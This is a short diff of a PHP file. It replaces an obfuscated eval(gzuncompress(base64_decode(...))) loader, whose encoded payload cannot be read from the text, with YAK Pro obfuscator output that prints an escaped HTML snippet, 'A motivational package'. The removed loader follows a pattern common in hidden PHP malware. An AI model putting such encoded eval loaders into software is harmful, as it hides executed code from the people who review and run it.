@@ -1,1 +1,8 @@
-<?php ob_start();$akugkjugkjgkujfkhdjdutduydihfoufkudysiyikufolufkudikydiufoujfoudkyxujtsyrsrfsytgdihogipigogoakugkjugkjgkujfkhdjdutduydihfoufkudysiyikufolufkudikydiufoujfoudkyxujtsyrsrfsytgdihogipigogoakugkjugkjgkujfkhdjdutduydihfoufkudysiyikufolufkudikydiufoujfoudkyxujtsyrsrfsytgdihogipigogo='eNolyjEOgCAMAMDdV3QTJh8ggfgSU7EiEQpBZDH+3Rjnu7TMxOtsAyELORqtTN5zB9vFtvrE4Kg2LELeUKhehaFXZ8QQ9AQxVd/wWxggoz3QkRp+7Ud4Xt90IFo=';eval(gzuncompress(base64_decode($akugkjugkjgkujfkhdjdutduydihfoufkudysiyikufolufkudikydiufoujfoudkyxujtsyrsrfsytgdihogipigogoakugkjugkjgkujfkhdjdutduydihfoufkudysiyikufolufkudikydiufoujfoudkyxujtsyrsrfsytgdihogipigogoakugkjugkjgkujfkhdjdutduydihfoufkudysiyikufolufkudikydiufoujfoudkyxujtsyrsrfsytgdihogipigogo)));$v=ob_get_contents();ob_end_clean(); echo $v;
+<?php
+/*   __________________________________________________
+    |  Obfuscated by YAK Pro - Php Obfuscator  2.0.14  |
+    |              on 2022-09-29 13:59:28              |
+    |    GitHub: https://github.com/pk-fr/yakpro-po    |
+    |__________________________________________________|
+*/
+ function YMG_U() { return "\74\163\155\141\x6c\154\76\x41\40\x6d\x6f\x74\x69\x76\141\164\151\x6f\x6e\141\x6c\40\160\141\143\x6b\x61\147\x65\74\57\163\x6d\141\x6c\154\x3e"; }
